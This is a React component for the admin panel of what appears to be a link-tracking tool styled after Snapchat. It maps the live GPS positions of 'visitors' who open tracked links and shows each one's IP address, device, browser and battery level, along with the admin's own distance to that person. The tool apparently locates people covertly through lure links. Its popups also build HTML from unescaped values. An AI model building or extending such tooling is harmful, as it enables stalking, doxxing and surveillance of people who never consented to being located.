// components/admin/LiveMap.tsx
"use client";

import React, { useEffect, useRef, useState } from "react";
import { LiveLocationItem } from "@/hooks/useRealtimeLocations";
import {
  getMapTileConfig, MapMode, createSnapGhostIcon, createSnapAccuracyCircle,
  createAdminLocationIcon, createAdminAccuracyCircle, calculateDistanceMeters,
  formatDistance, fetchAdminCoordinates,
} from "@/lib/map-utils";
import { Compass, Navigation, ExternalLink, MapPin, Layers, Globe, LocateFixed } from "lucide-react";
import { useTheme } from "@/hooks/useTheme";

export const LiveMap: React.FC<{ locations: LiveLocationItem[] }> = ({ locations }) => {
  const mapRef = useRef<HTMLDivElement>(null), mapInst = useRef<any>(null);
  const layerRef = useRef<any>(null), tileRef = useRef<any>(null), overlayRef = useRef<any>(null), hasFittedRef = useRef(false);
  const [adminLoc, setAdminLoc] = useState<{ lat: number; lng: number; acc?: number } | null>(null);
  const [selectedIdx, setSelectedIdx] = useState(0);
  const [mapMode, setMapMode] = useState<MapMode>("streets");
  const { theme } = useTheme();

  const valid = locations.filter((l) => Math.abs(l.latitude) > 0.001 && Math.abs(l.longitude) > 0.001);
  const selectedLoc = valid[selectedIdx] || valid[0] || null;

  useEffect(() => {
    const saved = typeof window !== "undefined" ? localStorage.getItem("snap_map_mode") as MapMode : null;
    if (saved && (saved === "streets" || saved === "satellite")) setMapMode(saved);
    const unwatch = fetchAdminCoordinates((c) => setAdminLoc(c));
    return () => { if (unwatch) unwatch(); };
  }, []);

  const handleModeChange = (m: MapMode) => {
    setMapMode(m);
    if (typeof window !== "undefined") localStorage.setItem("snap_map_mode", m);
  };

  const updateMarkers = (L: any, map: any, layer: any, items: LiveLocationItem[], aLoc: typeof adminLoc, activeIdx: number) => {
    layer.clearLayers();
    if (!items.length && !aLoc) return;
    const bounds: [number, number][] = [], active = items[activeIdx] || items[0] || null;

    if (items.length > 1) {
      const trail: [number, number][] = [];
      for (const p of items) {
        if (!trail.length) trail.push([p.latitude, p.longitude]);
        else if (calculateDistanceMeters(trail[trail.length - 1][0], trail[trail.length - 1][1], p.latitude, p.longitude) >= 35) trail.push([p.latitude, p.longitude]);
      }
      const totalSpan = trail.length > 1 ? calculateDistanceMeters(trail[0][0], trail[0][1], trail[trail.length - 1][0], trail[trail.length - 1][1]) : 0;
      if (trail.length > 1 && totalSpan >= 45) {
        L.polyline(trail, { color: "#FFFC00", weight: 3, opacity: 0.8, dashArray: "6, 8" }).addTo(layer);
        trail.slice(0, -1).forEach(([lat, lng]) => L.circleMarker([lat, lng], { radius: 3.5, color: "#000", fillColor: "#FFFC00", fillOpacity: 0.8, weight: 1.5 }).addTo(layer));
      }
    }

    items.forEach((loc, idx) => {
      const pos: [number, number] = [loc.latitude, loc.longitude];
      bounds.push(pos);
      const marker = L.marker(pos, { icon: createSnapGhostIcon(L, 38) }).addTo(layer);
      if (loc.accuracy && loc.accuracy > 0) createSnapAccuracyCircle(L, pos, loc.accuracy).addTo(layer);
      const distStr = aLoc ? formatDistance(calculateDistanceMeters(aLoc.lat, aLoc.lng, loc.latitude, loc.longitude), loc.accuracy, aLoc.acc) : null;
      const gmapsUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
      const devStr = [loc.deviceInfo?.os, loc.deviceInfo?.browser, loc.deviceInfo?.battery !== undefined ? `${loc.deviceInfo.battery}%` : null].filter(Boolean).join(" • ");
      marker.on("click", () => setSelectedIdx(idx));
      marker.bindPopup(`<div style="color:#000;font-family:sans-serif;padding:4px;min-width:180px;"><strong style="font-size:14px;display:block;">${loc.linkTitle || `Visitor #${idx + 1}`}</strong>${loc.ipAddress ? `<span style="font-size:12px;color:#333;display:block;">IP: <b>${loc.ipAddress}</b></span>` : ""}${devStr ? `<span style="font-size:12px;color:#555;display:block;">${devStr}</span>` : ""}<span style="font-size:12px;color:#555;display:block;">${loc.latitude.toFixed(4)}, ${loc.longitude.toFixed(4)} &bull; ±${Math.round(loc.accuracy || 0)}m</span>${distStr ? `<div style="margin:4px 0;font-size:12px;color:#1a73e8;font-weight:bold;">📏 Admin to Location: ${distStr}</div>` : ""}<div style="display:flex;gap:6px;margin-top:6px;"><a href="${gmapsUrl}" target="_blank" rel="noopener noreferrer" style="display:inline-block;font-size:12px;background:#000;color:#FFFC00;padding:5px 10px;border-radius:8px;text-decoration:none;font-weight:bold;">Google Maps &rarr;</a>${loc.linkId ? `<a href="/admin/links/${loc.linkId}" style="display:inline-block;font-size:12px;background:#eee;color:#000;padding:5px 10px;border-radius:8px;text-decoration:none;font-weight:bold;">Track Link</a>` : ""}</div></div>`);
    });

    if (aLoc) {
      bounds.push([aLoc.lat, aLoc.lng]);
      const aMarker = L.marker([aLoc.lat, aLoc.lng], { icon: createAdminLocationIcon(L, 30), zIndexOffset: 3000 }).addTo(layer);
      if (aLoc.acc) createAdminAccuracyCircle(L, [aLoc.lat, aLoc.lng], aLoc.acc).addTo(layer);
      const dM = active ? calculateDistanceMeters(aLoc.lat, aLoc.lng, active.latitude, active.longitude) : 0;
      const dToAct = active ? formatDistance(dM, active.accuracy, aLoc.acc) : null;
      aMarker.bindPopup(`<div style="color:#000;font-family:sans-serif;font-size:13px;padding:4px;"><strong style="font-size:14px;display:block;">📍 Admin Location (You)</strong><span style="color:#555;font-size:12px;">GPS Acc: ±${Math.round(aLoc.acc || 0)}m</span>${dToAct ? `<br/><strong style="font-size:12px;">Admin to ${active.linkTitle || 'Location'}: ${dToAct}</strong>` : ""}</div>`);
      const sameLocThresh = Math.min(Math.max(25, ((active?.accuracy || 0) + (aLoc.acc || 0))), 150);
      if (active && dM > sameLocThresh) L.polyline([[aLoc.lat, aLoc.lng], [active.latitude, active.longitude]], { color: "#1a73e8", weight: 2.5, opacity: 0.9, dashArray: "6, 6" }).addTo(layer);
    }

    if (!hasFittedRef.current && bounds.length > 0) {
      if (bounds.length === 1) map.setView(bounds[0], 14);
      else map.fitBounds(bounds, { padding: [45, 45], maxZoom: 15 });
      hasFittedRef.current = true;
    }
  };

  useEffect(() => {
    let active = true;
    async function initMap() {
      if (!mapRef.current || mapInst.current) return;
      const L = (await import("leaflet")).default;
      if (!active || !mapRef.current) return;
      const center: [number, number] = valid.length ? [valid[0].latitude, valid[0].longitude] : [31.5204, 74.3587];
      const map = L.map(mapRef.current, { zoomControl: false, attributionControl: false }).setView(center, valid.length ? 14 : 6);
      if (valid.length > 0) hasFittedRef.current = true;
      L.control.zoom({ position: "bottomright" }).addTo(map);
      const cfg = getMapTileConfig(mapMode, theme);
      tileRef.current = L.tileLayer(cfg.url, cfg.options).addTo(map);
      if (cfg.overlayUrl) overlayRef.current = L.tileLayer(cfg.overlayUrl, cfg.overlayOptions).addTo(map);
      layerRef.current = L.layerGroup().addTo(map);
      mapInst.current = map;
      setTimeout(() => map.invalidateSize(), 250);
      updateMarkers(L, map, layerRef.current, valid, adminLoc, selectedIdx);
    }
    initMap();
    return () => { active = false; if (mapInst.current) { mapInst.current.remove(); mapInst.current = null; } };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (!mapInst.current) return;
    const cfg = getMapTileConfig(mapMode, theme);
    if (tileRef.current) tileRef.current.remove();
    import("leaflet").then((m) => {
      if (!mapInst.current) return;
      tileRef.current = m.default.tileLayer(cfg.url, cfg.options).addTo(mapInst.current);
    });
  }, [mapMode, theme]);

  useEffect(() => {
    if (mapInst.current && layerRef.current) import("leaflet").then((m) => updateMarkers(m.default, mapInst.current, layerRef.current, valid, adminLoc, selectedIdx));
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [valid, adminLoc, selectedIdx]);

  const handleRecenter = () => {
    if (!mapInst.current) return;
    const bounds: [number, number][] = valid.map((p) => [p.latitude, p.longitude]);
    if (adminLoc) bounds.push([adminLoc.lat, adminLoc.lng]);
    if (bounds.length === 1) mapInst.current.setView(bounds[0], 14);
    else if (bounds.length > 1) mapInst.current.fitBounds(bounds, { padding: [45, 45], maxZoom: 15 });
  };

  const currentDist = adminLoc && selectedLoc ? formatDistance(calculateDistanceMeters(adminLoc.lat, adminLoc.lng, selectedLoc.latitude, selectedLoc.longitude), selectedLoc.accuracy, adminLoc.acc) : null;

  return (
    <div className="relative w-full h-[470px] rounded-3xl overflow-hidden border border-white/10 shadow-2xl bg-[#0B0B0E] snap-map-overlay" data-map-overlay="true">
      <div ref={mapRef} className="w-full h-full z-0 bg-[#0B0B0E]" />

      {/* Unified Top HUD Row: Status on Left, Layer Switcher on Right (Never Cropped or Hidden) */}
      <div className="absolute top-2 left-2 right-2 z-10 flex items-start justify-between pointer-events-none gap-1">
        <div className="flex items-center gap-1 flex-wrap max-w-[calc(100%-120px)]">
          <div className="pointer-events-auto flex items-center gap-1 py-1 px-2 rounded-lg bg-[#0B0B0E]/90 backdrop-blur-xl border border-white/10 shadow-md">
            <span className="w-1.5 h-1.5 rounded-full shrink-0 bg-[#FFFC00] animate-pulse" />
            <span className="text-[11px] font-bold text-white whitespace-nowrap">{valid.length} {valid.length === 1 ? "Pin" : "Pins"}</span>
          </div>
          {adminLoc && (
            <div className="pointer-events-auto flex items-center gap-1 py-1 px-2 rounded-lg bg-[#0B0B0E]/90 backdrop-blur-xl border border-blue-500/40 shadow-md">
              <span className="w-1.5 h-1.5 rounded-full shrink-0 bg-blue-500 shadow-[0_0_8px_#3b82f6] animate-pulse" />
              <span className="text-[11px] font-bold text-blue-300 whitespace-nowrap">Admin<span className="hidden sm:inline"> (You)</span></span>
            </div>
          )}
        </div>

        {/* Top Right: Compact Layer Switcher */}
        <div className="pointer-events-auto shrink-0 flex items-center bg-[#0B0B0E]/90 backdrop-blur-xl border border-white/10 rounded-lg p-0.5 shadow-md">
          {(["streets", "satellite"] as const).map((m) => (
            <button key={m} onClick={() => handleModeChange(m)} className={`flex items-center gap-1 py-0.5 px-2 rounded-md text-[11px] font-bold capitalize transition-all ${mapMode === m ? "bg-[#FFFC00] text-black shadow-sm" : "text-white/70 hover:text-white"}`}>
              {m === "streets" ? <Layers className="w-3 h-3" /> : <Globe className="w-3 h-3" />}<span>{m}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Google Maps-style Locate / Recenter Floating Button */}
      <button onClick={handleRecenter} className="absolute bottom-20 right-2.5 z-10 p-2.5 rounded-2xl bg-[#0B0B0E]/90 hover:bg-black backdrop-blur-xl border border-white/15 text-[#FFFC00] shadow-xl active:scale-90 transition-all flex items-center justify-center group" title="Re-center map like Google Maps">
        <LocateFixed className="w-4 h-4 transition-transform group-hover:scale-110" />
      </button>

      {selectedLoc ? (
        <div className="absolute bottom-2 left-2 right-2 sm:right-auto sm:max-w-xs z-10 bg-[#0B0B0E]/95 backdrop-blur-xl border border-white/10 rounded-xl p-2.5 shadow-2xl">
          <div className="flex items-center justify-between gap-2 mb-1.5">
            <div className="flex items-center gap-1.5 min-w-0">
              <span className="text-xs sm:text-sm font-mono font-bold text-[#FFFC00] truncate">{selectedLoc.latitude.toFixed(4)}, {selectedLoc.longitude.toFixed(4)}</span>
              <span className="text-xs text-white/70 font-mono shrink-0">{selectedLoc.accuracy ? `±${Math.round(selectedLoc.accuracy)}m` : "GPS"}</span>
            </div>
            <a href={`https://www.google.com/maps?q=${selectedLoc.latitude},${selectedLoc.longitude}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 py-1 px-2.5 rounded-lg bg-[#FFFC00] hover:bg-[#FFFC00]/90 text-black font-bold text-xs shrink-0 transition-all active:scale-95 shadow-sm" title="Open Google Maps">
              <Navigation className="w-3 h-3 text-black" /><span>Maps</span><ExternalLink className="w-3 h-3 text-black/60" />
            </a>
          </div>
          {currentDist && (
            <button onClick={handleRecenter} title="Click to frame map between you and selected location" className="w-full flex items-center justify-between gap-1.5 py-1 px-2.5 rounded-lg bg-blue-500/15 hover:bg-blue-500/25 border border-blue-500/25 text-blue-300 text-xs font-medium leading-none transition-all active:scale-[0.99]">
              <span className="flex items-center gap-1 truncate"><Compass className="w-3.5 h-3.5 text-blue-400 shrink-0" /><span className="truncate">Admin ➔ {selectedLoc.linkTitle ? "Pin" : `#${selectedIdx + 1}`}: {currentDist}</span></span>
              <span className="text-[10px] text-blue-400 uppercase tracking-wider shrink-0 font-bold">Fit</span>
            </button>
          )}
        </div>
      ) : (
        <div className="absolute inset-0 z-10 flex flex-col items-center justify-center bg-[#0B0B0E]/80 backdrop-blur-sm text-center p-6">
          <MapPin className="w-10 h-10 text-white/30 mb-2" /><h4 className="text-sm font-bold text-white">No Live Locations Yet</h4><p className="text-xs text-white/50 mt-1 max-w-xs">Incoming visitor coordinates will automatically plot on this map.</p>
        </div>
      )}
    </div>
  );
};
